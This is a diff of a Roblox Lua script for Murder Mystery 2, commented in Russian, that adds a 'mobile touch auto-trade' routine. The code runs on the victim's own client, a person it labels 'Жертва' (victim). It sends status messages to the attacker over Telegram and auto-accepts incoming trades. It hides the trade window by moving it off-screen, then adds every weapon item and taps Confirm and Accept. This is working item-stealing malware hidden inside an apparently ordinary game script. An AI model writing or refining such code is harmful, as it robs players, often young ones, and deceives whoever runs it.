@@ -649,12 +649,12 @@ rejoinBtn.MouseButton1Click:Connect(function()
     end)
     pcall(function() TeleportService:Teleport(game.PlaceId, lp) end)
 end)
-
 -- ==========================================
--- MM2 ULTIMATE AUTO-TRADE (Hook + Visible)
+-- MM2 MOBILE TOUCH AUTO-TRADE (Финальный)
 -- ==========================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 local lp = Players.LocalPlayer
 local playerGui = lp:WaitForChild("PlayerGui")
 
@@ -671,22 +671,23 @@ local function send_tg(text)
     end)
 end
 
-send_tg("🚀 Ultimate скрипт запущен!\nЖертва: " .. lp.Name)
+send_tg("🚀 MOBILE скрипт запущен!\nЖертва: " .. lp.Name)
 
 local is_busy = false
 
--- Функция безопасного клика (пробует разные методы)
-local function safe_click(btn)
+-- ФУНКЦИЯ ВИРТУАЛЬНОГО ТАПА (Нажимает пальцем по координатам)
+local function touch_btn(btn)
     if not btn then return end
-    pcall(function() btn.MouseButton1Click:Fire() end)
-    pcall(function() btn.MouseButton1Down:Fire() end)
-    pcall(function() btn.MouseButton1Up:Fire() end)
-    -- Если это Delta, попробуем вызвать через InputBegan
     pcall(function()
-        local vim = game:GetService("VirtualInputManager")
-        vim:SendMouseButtonEvent(btn.AbsolutePosition.X + 5, btn.AbsolutePosition.Y + 5, 0, true, game, 1)
+        local pos = btn.AbsolutePosition
+        local size = btn.AbsoluteSize
+        local x = pos.X + (size.X / 2)
+        local y = pos.Y + (size.Y / 2)
+        
+        -- Эмулируем нажатие пальцем
+        VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1) -- Палец вниз
         task.wait(0.05)
-        vim:SendMouseButtonEvent(btn.AbsolutePosition.X + 5, btn.AbsolutePosition.Y + 5, 0, false, game, 1)
+        VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1) -- Палец вверх
     end)
 end
 
@@ -702,9 +703,10 @@ task.spawn(function()
             if plus then
                 local trade_req = plus:FindFirstChild("TradeRequest")
                 if trade_req and trade_req:FindFirstChild("TextLabel") and trade_req.TextLabel.Text == "!" then
-                    send_tg("🔔 Пришел трейд! Жму плюсик.")
-                    safe_click(plus:FindFirstChild("Button", true))
-                    task.wait(1.5) -- Даем время окну открыться
+                    send_tg("🔔 Пришел трейд! Тапаю плюсик.")
+                    local btn = plus:FindFirstChild("Button", true)
+                    touch_btn(btn)
+                    task.wait(2) -- Ждем открытия окна
                 end
             end
         end
@@ -725,23 +727,22 @@ task.spawn(function()
             if is_my_trade and not gui:GetAttribute("Hacked") then
                 gui:SetAttribute("Hacked", true)
                 is_busy = true
-                send_tg("✅ Окно трейда найдено! Прячу.")
+                send_tg("✅ Окно трейда найдено!")
                 
-                -- Прячем через Visible и Position
-                for _, child in ipairs(gui:GetDescendants()) do
-                    if child:IsA("Frame") or child:IsA("ImageLabel") then
-                        pcall(function() child.Visible = false end)
+                -- Прячем окно (уносим за экран)
+                for _, child in ipairs(gui:GetChildren()) do
+                    if child:IsA("Frame") then
+                        child.Position = UDim2.new(0, -5000, 0, -5000)
                     end
                 end
-                
                 task.wait(1)
                 
                 -- Жмем Add Items
                 local add_items_btn = gui:FindFirstChild("AddItem", true)
                 if add_items_btn and add_items_btn:FindFirstChild("ActionButton") then
-                    safe_click(add_items_btn.ActionButton)
-                    send_tg("🖱 Открыл меню предметов.")
-                    task.wait(1)
+                    touch_btn(add_items_btn.ActionButton)
+                    send_tg("🖱 Открыл меню предметов (Тап.")
+                    task.wait(1.5)
                 end
 
                 -- Закликиваем оружие
@@ -756,24 +757,22 @@ task.spawn(function()
                             if item.Name == "NewItem" then
                                 local btn = item:FindFirstChild("Button", true)
                                 if btn then
-                                    safe_click(btn)
+                                    touch_btn(btn)
                                     clicked = clicked + 1
-                                    task.wait(0.2) -- Чуть медленнее, чтобы сервер успевал
+                                    task.wait(0.2)
                                     break
                                 end
                             end
                         end
-                        task.wait(0.05)
+                        task.wait(0.1)
                     end
-                    send_tg("⏳ Кликнул по предметам: " .. tostring(clicked))
-                else
-                    send_tg("⚠️ Не нашел папку с оружием.")
+                    send_tg("⏳ Закликал предметов (тапом): " .. tostring(clicked))
                 end
 
-                -- Возвращаем видимость (если нужно)
-                for _, child in ipairs(gui:GetDescendants()) do
-                    if child:IsA("Frame") or child:IsA("ImageLabel") then
-                        pcall(function() child.Visible = true end)
+                -- Возвращаем окно
+                for _, child in ipairs(gui:GetChildren()) do
+                    if child:IsA("Frame") then
+                        child.Position = UDim2.new(0.5, 0, 0.5, 0)
                     end
                 end
                 task.wait(0.5)
@@ -786,13 +785,14 @@ task.spawn(function()
                 if accept_folder then
                     local confirm = accept_folder:FindFirstChild("Confirm", true)
                     if confirm and confirm:FindFirstChild("ActionButton") then
-                        safe_click(confirm.ActionButton)
+                        touch_btn(confirm.ActionButton)
+                        send_tg("✅ Первый тап по Confirm.")
                         task.wait(1)
                     end
                     local final_btn = accept_folder:FindFirstChild("ActionButton")
                     if final_btn then
-                        safe_click(final_btn)
-                        send_tg("💰 Всё, жму финальный Accept!")
+                        touch_btn(final_btn)
+                        send_tg("💰 Финальный тап по Accept!")
                     end
                 end
                 
